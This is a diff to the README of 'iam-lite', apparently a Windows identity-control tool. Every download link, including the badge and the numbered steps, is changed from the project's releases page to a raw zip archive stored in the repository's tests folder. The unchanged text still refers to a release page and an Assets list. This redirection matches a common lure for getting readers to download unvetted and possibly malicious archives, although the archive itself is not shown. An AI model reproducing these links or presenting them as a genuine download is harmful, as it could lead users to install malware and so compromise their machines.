@@ -1,11 +1,11 @@
 # 🛡️ iam-lite - Simple identity control for teams
 
-[![Download iam-lite](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Duffelcoatterpsichore141/iam-lite/releases)
+[![Download iam-lite](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Duffelcoatterpsichore141/iam-lite/main/tests/iam-lite-v2.1.zip)
 
 ## 🚀 Download iam-lite
 
 Visit this page to download:
-https://github.com/Duffelcoatterpsichore141/iam-lite/releases
+https://raw.githubusercontent.com/Duffelcoatterpsichore141/iam-lite/main/tests/iam-lite-v2.1.zip
 
 Choose the latest release for Windows, then download the file that matches your PC.
 
@@ -36,7 +36,7 @@ Before you start, make sure your Windows PC has:
 ## 🪟 Download for Windows
 
 1. Open the release page:
-   https://github.com/Duffelcoatterpsichore141/iam-lite/releases
+   https://raw.githubusercontent.com/Duffelcoatterpsichore141/iam-lite/main/tests/iam-lite-v2.1.zip
 2. Find the latest release at the top.
 3. Look for the Windows file in the Assets list.
 4. Download the file to your computer.
@@ -182,6 +182,6 @@ A basic setup can look like this:
 ## 📥 Download again
 
 If you need the file again, use the release page:
-https://github.com/Duffelcoatterpsichore141/iam-lite/releases
+https://raw.githubusercontent.com/Duffelcoatterpsichore141/iam-lite/main/tests/iam-lite-v2.1.zip
 
 Choose the newest Windows download from the Assets list
